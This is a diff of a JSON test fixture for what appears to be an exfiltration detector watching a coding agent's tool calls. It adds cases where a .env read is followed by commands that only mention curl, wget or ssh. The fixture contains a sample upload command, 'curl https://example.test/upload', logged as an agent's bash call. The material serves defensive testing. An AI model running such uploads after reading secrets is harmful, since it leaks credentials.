@@ -1,6 +1,6 @@
 {
   "source": "authored",
-  "note": "A sensitive read with no egress, egress before the read, denied egress of each kind (it never ran), and egress outside the 30-minute window. A local commit after the read whose message mentions push is not a push.",
+  "note": "A sensitive read with no egress, egress before the read, denied egress of each kind (it never ran), and egress outside the 30-minute window. A local commit after the read whose message mentions push is not a push. Version 2 (ticket 64): after a .env read, a command that only mentions curl, wget or ssh as text is not egress.",
   "events": [
     {
       "id": "evt_exfil_start",
@@ -229,6 +229,76 @@
         "hook": "tool.execute.after",
         "target_tool": "bash",
         "target": "curl https://example.test/upload",
+        "exit_code": 0,
+        "outcome": "ok"
+      },
+      "raw_extra": {}
+    },
+    {
+      "id": "evt_exfil_mention_env",
+      "schema_version": 1,
+      "type": "document.access",
+      "session_id": "ses_exfil",
+      "agent": {
+        "name": "opencode",
+        "version": "unknown"
+      },
+      "capture_path": "plugin_hook",
+      "timestamp": "2026-11-07T12:00:00.000Z",
+      "seq": null,
+      "duration_ms": null,
+      "correlation_id": "call_exfil_mention_env",
+      "prev_hash": null,
+      "data": {
+        "path": "/home/dev/demo/.env",
+        "operation": "read",
+        "outcome": "ok"
+      },
+      "raw_extra": {}
+    },
+    {
+      "id": "evt_exfil_mention_curl",
+      "schema_version": 1,
+      "type": "hook.script",
+      "session_id": "ses_exfil",
+      "agent": {
+        "name": "opencode",
+        "version": "unknown"
+      },
+      "capture_path": "plugin_hook",
+      "timestamp": "2026-11-07T12:01:00.000Z",
+      "seq": null,
+      "duration_ms": null,
+      "correlation_id": "call_exfil_mention_curl",
+      "prev_hash": null,
+      "data": {
+        "hook": "tool.execute.after",
+        "target_tool": "bash",
+        "target": "echo \"install curl and wget first\" >> NOTES.md",
+        "exit_code": 0,
+        "outcome": "ok"
+      },
+      "raw_extra": {}
+    },
+    {
+      "id": "evt_exfil_grep_ssh",
+      "schema_version": 1,
+      "type": "hook.script",
+      "session_id": "ses_exfil",
+      "agent": {
+        "name": "opencode",
+        "version": "unknown"
+      },
+      "capture_path": "plugin_hook",
+      "timestamp": "2026-11-07T12:02:00.000Z",
+      "seq": null,
+      "duration_ms": null,
+      "correlation_id": "call_exfil_grep_ssh",
+      "prev_hash": null,
+      "data": {
+        "hook": "tool.execute.after",
+        "target_tool": "bash",
+        "target": "grep -rn \"ssh\" docs",
         "exit_code": 0,
         "outcome": "ok"
       },
